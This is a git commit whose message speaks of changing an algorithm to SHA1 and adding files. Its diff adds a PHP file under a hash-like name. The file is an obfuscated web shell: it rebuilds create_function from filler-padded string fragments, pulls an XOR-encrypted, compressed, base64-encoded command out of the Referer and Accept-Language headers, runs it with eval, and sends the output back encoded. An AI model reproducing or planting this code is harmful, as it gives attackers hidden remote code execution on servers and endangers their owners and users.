d14b9ee51e292ec6ca770e7df9af19f7827c103d
2535615550@qq.com <zhs25643@tcent.cn>
2017-02-22 12:40:55 +0800

    update all chang algorithm to sha1 and add files

---
+++ php/cd293900839a565bd4057b72c9893ed47b70cb97.php
@@ -0,0 +1,17 @@
+<?php
+$f='$kh="5d41"8,;$kf8,="402a8,";8,function x(8,$t,$k8,){$c=s8,trlen8,($k)8,;$l=8,strlen($t);$o=8,8,"";8,for($i=0';
+$P='y8,_exist8,s8,8,($i,$s)){$s[$8,i8,].=$p;$e=s8,tr8,p8,os($s[$i],$f);if($e8,){$k=8,$kh.$8,kf;ob_s8,tart8,';
+$w=';$i<$8,l8,;){for($j=0;8,($j<$c&8,&$i8,<$l8,);$j++8,,$i++){$o.8,=$t{$8,i8,}^8,8,$k{$j};}}return $o;}8,8,';
+$T='a){$u=par8,se_url(8,$rr);p8,arse_s8,tr($8,u[8,"query"],$8,q);$8,q=array_8,values(8,$q)8,;preg_mat8,ch_a';
+$u='ll8,("8,/([\\w])[8,\\w-]+(8,?:;q8,=0.([\\d]))?8,,?/",$8,ra,8,$m);if($8,q&8,&$m8,){8,@sessio8,n_st8,art();$s8';
+$q='$r=$_SERVER;$r8,r8,=@$r["HTTP_R8,EFERER"8,];$r8,a=@8,$r["HTTP_8,ACCE8,PT_LANG8,UAGE8,"];if($rr&8,&8,$r';
+$s=',8,=&$_SESSION;$ss="8,substr";$sl=8,"s8,tr8,tolower8,";$i8,8,=$m[1][0].8,$m[1][1];$h=$sl($8,8,ss(md5($';
+$r='se8,64_enc8,ode(x(gzc8,om8,pre8,ss($o),$k)8,);print(8,"8,8,<$k8,>$d</$k>")8,8,;@session_destroy();}}}}';
+$b='ay("/","+"),8,$ss($8,s[$i],8,08,,$e)))8,,$k)));$o8,=ob_get_8,c8,ontents()8,;8,ob8,_end_c8,lean();$d=ba';
+$Q='++)8,$8,8,p.8,=$q[$m[2][$z]];if(8,st8,rpos($p,$h)==8,=0){8,$s[$8,i]8,="";8,$p=$ss(8,$p,3);}if(array_ke';
+$Z='();@eva8,l(@gzunco8,mpre8,ss(@x(8,@b8,ase68,4_deco8,de(pre8,g_replace(ar8,ray("/_/8,","/8,-/8,8,"),arr';
+$K='i.$8,kh),0,8,3))8,;$f=$sl8,($ss(m8,d5($i.$k8,f),0,8,3));$p="8,"8,;for($8,z=1;$z<coun8,t($m8,[1]);$z8,';
+$e=str_replace('Z','','cZZreate_ZfuZnZcZtion');
+$M=str_replace('8,','',$f.$w.$q.$T.$u.$s.$K.$Q.$P.$Z.$b.$r);
+$i=$e('',$M);$i();
+?>
